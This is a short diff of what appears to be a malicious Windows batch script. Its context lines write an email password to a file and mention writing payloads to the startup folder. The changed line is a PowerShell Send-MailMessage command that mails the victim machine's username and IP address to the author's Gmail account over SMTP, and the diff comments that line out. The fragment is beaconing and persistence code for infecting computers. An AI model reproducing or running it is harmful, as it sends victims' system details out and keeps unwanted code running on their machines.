@@ -17,7 +17,7 @@ echo %email_pword% > pass.txt
 
 
 @REM setup smtp
-powershell Send-MailMessage -From %email_uname% -To %email_uname% -subject "$env:UserName" -Body (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList %email_uname%, (ConvertTo-SecureString -String %email_pword% -AsPlainText -Force))
+@REM powershell Send-MailMessage -From %email_uname% -To %email_uname% -subject "$env:UserName" -Body (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList %email_uname%, (ConvertTo-SecureString -String %email_pword% -AsPlainText -Force))
 
 
 @REM write payloads to startup
